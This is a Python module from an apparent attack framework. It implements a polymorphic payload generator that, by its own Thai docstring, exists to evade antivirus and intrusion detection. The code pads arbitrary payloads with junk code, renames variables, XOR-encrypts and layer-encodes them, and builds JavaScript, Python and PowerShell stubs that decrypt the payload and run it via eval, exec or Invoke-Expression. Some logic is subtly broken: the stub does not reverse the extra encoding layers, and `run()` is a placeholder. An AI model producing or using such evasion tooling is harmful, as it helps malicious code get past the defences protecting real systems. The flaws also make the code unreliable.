from core.base_agent import BaseAgent
from core.data_models import AgentData, Strategy, AttackPhase
"""
Polymorphic Payload Generator
สร้าง payloads ที่เปลี่ยน signature ทุกครั้งเพื่อหลบหลีก AV/IDS
"""

import random
import string
import hashlib
import base64
from typing import Dict, List, Optional
from datetime import datetime
from core.logger import log


class PolymorphicGenerator:
    """
    Generate polymorphic payloads that change signature each time
    
    Features:
    - Random junk code insertion
    - Variable name obfuscation
    - Code reordering
    - Encryption with random keys
    - Multiple encoding layers
    """
    
    def __init__(self):
        """Initialize polymorphic generator"""
        self.junk_templates = [
            "var {var} = {value};",
            "let {var} = {value};",
            "const {var} = {value};",
            "if ({var} > 0) {{ {var} = {var} + 1; }}",
            "for (var i = 0; i < {value}; i++) {{ /* nop */ }}",
            "while ({var} < {value}) {{ {var}++; }}",
            "function {func}() {{ return {value}; }}",
            "// {comment}",
            "/* {comment} */",
        ]
        
        self.obfuscation_techniques = [
            "base64",
            "hex",
            "rot13",
            "reverse",
            "xor"
        ]
    
    async def run(self, target: Dict) -> Dict:
        """
        Main entry point for PolymorphicGenerator
        
        Args:
            target: Dict containing target information and parameters
        
        Returns:
            Dict with execution results
        """
        try:
            log.info(f"[PolymorphicGenerator] Starting execution")
            
                        # This is a placeholder implementation
            
            return {
                'success': True,
                'message': 'PolymorphicGenerator executed successfully',
                'target': target
            }
        
        except Exception as e:
            log.error(f"[PolymorphicGenerator] Error: {e}")
            return {
                'success': False,
                'error': str(e)
            }
    

    async def generate_polymorphic_payload(
        self, 
        base_payload: str,
        language: str = "javascript",
        obfuscation_level: int = 3
    ) -> Dict:
        """
        Generate polymorphic version of payload
        
        Args:
            base_payload: Original payload code
            language: Programming language (javascript, python, powershell)
            obfuscation_level: Level of obfuscation (1-5)
        
        Returns:
            Dict with polymorphic payload
        """
        try:
            log.info(f"[PolymorphicGenerator] Generating polymorphic payload (level {obfuscation_level})")
            
            # 1. Add random junk code
            junk = self._generate_junk_code(language, obfuscation_level * 5)
            
            # 2. Obfuscate variable names
            obfuscated_payload = self._obfuscate_variables(base_payload, language)
            
            # 3. Encrypt payload with random key
            key = self._generate_random_key()
            encrypted = self._encrypt_payload(obfuscated_payload, key)
            
            # 4. Generate decryption stub
            stub = self._generate_decryption_stub(key, language)
            
            # 5. Add multiple encoding layers
            if obfuscation_level >= 3:
                encrypted = self._add_encoding_layers(encrypted, obfuscation_level)
            
            # 6. Combine all parts
            polymorphic_payload = self._combine_payload(junk, stub, encrypted, language)
            
            # 7. Calculate signature
            signature = hashlib.sha256(polymorphic_payload.encode()).hexdigest()
            
            result = {
                "success": True,
                "payload": polymorphic_payload,
                "signature": signature,
                "language": language,
                "obfuscation_level": obfuscation_level,
                "size": len(polymorphic_payload),
                "timestamp": datetime.now().isoformat()
            }
            
            log.success(f"[PolymorphicGenerator] Generated payload with signature: {signature[:16]}...")
            
            return result
            
        except Exception as e:
            log.error(f"[PolymorphicGenerator] Generation failed: {e}")
            return {
                "success": False,
                "error": str(e)
            }
    
    def _generate_junk_code(self, language: str, count: int) -> str:
        """
        Generate random junk code
        
        Args:
            language: Programming language
            count: Number of junk lines
        
        Returns:
            Junk code string
        """
        junk_lines = []
        
        for _ in range(count):
            template = random.choice(self.junk_templates)
            
            # Generate random values
            var_name = self._random_identifier()
            func_name = self._random_identifier()
            value = random.randint(1, 1000)
            comment = self._random_comment()
            
            # Fill template
            junk_line = template.format(
                var=var_name,
                func=func_name,
                value=value,
                comment=comment
            )
            
            junk_lines.append(junk_line)
        
        return '\n'.join(junk_lines)
    
    def _obfuscate_variables(self, code: str, language: str) -> str:
        """
        Obfuscate variable names in code
        
        Args:
            code: Original code
            language: Programming language
        
        Returns:
            Obfuscated code
        """
        # Common variable names to obfuscate
        common_vars = [
            'payload', 'data', 'result', 'response', 'request',
            'url', 'target', 'exploit', 'shell', 'cmd', 'command'
        ]
        
        obfuscated = code
        
        for var in common_vars:
            if var in obfuscated:
                new_var = self._random_identifier()
                obfuscated = obfuscated.replace(var, new_var)
        
        return obfuscated
    
    def _encrypt_payload(self, payload: str, key: str) -> str:
        """
        Encrypt payload with XOR
        
        Args:
            payload: Payload to encrypt
            key: Encryption key
        
        Returns:
            Encrypted payload (base64 encoded)
        """
        # XOR encryption
        encrypted_bytes = []
        key_bytes = key.encode()
        
        for i, char in enumerate(payload.encode()):
            encrypted_bytes.append(char ^ key_bytes[i % len(key_bytes)])
        
        # Base64 encode
        encrypted = base64.b64encode(bytes(encrypted_bytes)).decode()
        
        return encrypted
    
    def _generate_decryption_stub(self, key: str, language: str) -> str:
        """
        Generate decryption stub code
        
        Args:
            key: Decryption key
            language: Programming language
        
        Returns:
            Decryption stub code
        """
        if language == "javascript":
            stub = f"""
function {self._random_identifier()}(e, k) {{
    var d = atob(e);
    var r = '';
    for (var i = 0; i < d.length; i++) {{
        r += String.fromCharCode(d.charCodeAt(i) ^ k.charCodeAt(i % k.length));
    }}
    return r;
}}
var {self._random_identifier()} = '{key}';
"""
        
        elif language == "python":
            stub = f"""
import base64

def {self._random_identifier()}(e, k):
    d = base64.b64decode(e)
    r = ''
    for i, c in enumerate(d):
        r += chr(c ^ ord(k[i % len(k)]))
    return r

{self._random_identifier()} = '{key}'
"""
        
        elif language == "powershell":
            stub = f"""
function {self._random_identifier()} {{
    param($e, $k)
    $d = [System.Convert]::FromBase64String($e)
    $r = ''
    for ($i = 0; $i -lt $d.Length; $i++) {{
        $r += [char]($d[$i] -bxor [byte][char]$k[$i % $k.Length])
    }}
    return $r
}}
${self._random_identifier()} = '{key}'
"""
        
        else:
            stub = f"# Decryption stub for {language}\n"
        
        return stub
    
    def _add_encoding_layers(self, data: str, layers: int) -> str:
        """
        Add multiple encoding layers
        
        Args:
            data: Data to encode
            layers: Number of encoding layers
        
        Returns:
            Encoded data
        """
        encoded = data
        
        for i in range(min(layers, 5)):
            technique = random.choice(self.obfuscation_techniques)
            
            if technique == "base64":
                encoded = base64.b64encode(encoded.encode()).decode()
            
            elif technique == "hex":
                encoded = encoded.encode().hex()
            
            elif technique == "rot13":
                import codecs
                encoded = codecs.encode(encoded, 'rot_13')
            
            elif technique == "reverse":
                encoded = encoded[::-1]
            
            elif technique == "xor":
                # Simple XOR with random byte
                xor_key = random.randint(1, 255)
                encoded = ''.join(chr(ord(c) ^ xor_key) for c in encoded)
                encoded = base64.b64encode(encoded.encode()).decode()
        
        return encoded
    
    def _combine_payload(self, junk: str, stub: str, encrypted: str, language: str) -> str:
        """
        Combine junk, stub, and encrypted payload
        
        Args:
            junk: Junk code
            stub: Decryption stub
            encrypted: Encrypted payload
            language: Programming language
        
        Returns:
            Combined payload
        """
        if language == "javascript":
            combined = f"""
{junk}

{stub}

var {self._random_identifier()} = '{encrypted}';
eval({self._random_identifier()}({self._random_identifier()}, {self._random_identifier()}));
"""
        
        elif language == "python":
            combined = f"""
{junk}

{stub}

{self._random_identifier()} = '{encrypted}'
exec({self._random_identifier()}({self._random_identifier()}, {self._random_identifier()}))
"""
        
        elif language == "powershell":
            combined = f"""
{junk}

{stub}

${self._random_identifier()} = '{encrypted}'
Invoke-Expression ({self._random_identifier()} ${self._random_identifier()} ${self._random_identifier()})
"""
        
        else:
            combined = f"{junk}\n\n{stub}\n\n# Encrypted: {encrypted}\n"
        
        return combined
    
    def _random_identifier(self, length: int = 12) -> str:
        """Generate random identifier"""
        # Start with letter
        identifier = random.choice(string.ascii_letters)
        # Add random alphanumeric characters
        identifier += ''.join(random.choices(string.ascii_letters + string.digits, k=length-1))
        return identifier
    
    def _random_comment(self) -> str:
        """Generate random comment"""
        comments = [
            "TODO: refactor this",
            "FIXME: optimize performance",
            "NOTE: legacy code",
            "HACK: temporary workaround",
            "DEBUG: remove before production",
            "Random comment here",
            "This is important",
            "Do not delete",
        ]
        return random.choice(comments)
    
    def _generate_random_key(self, length: int = 32) -> str:
        """Generate random encryption key"""
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
    
    async def generate_multiple_variants(
        self,
        base_payload: str,
        count: int = 10,
        language: str = "javascript"
    ) -> List[Dict]:
        """
        Generate multiple polymorphic variants
        
        Args:
            base_payload: Original payload
            count: Number of variants to generate
            language: Programming language
        
        Returns:
            List of polymorphic payloads
        """
        log.info(f"[PolymorphicGenerator] Generating {count} variants")
        
        variants = []
        
        for i in range(count):
            # Vary obfuscation level
            obfuscation_level = random.randint(2, 5)
            
            variant = await self.generate_polymorphic_payload(
                base_payload,
                language,
                obfuscation_level
            )
            
            if variant.get("success"):
                variants.append(variant)
        
        log.success(f"[PolymorphicGenerator] Generated {len(variants)} unique variants")
        
        return variants

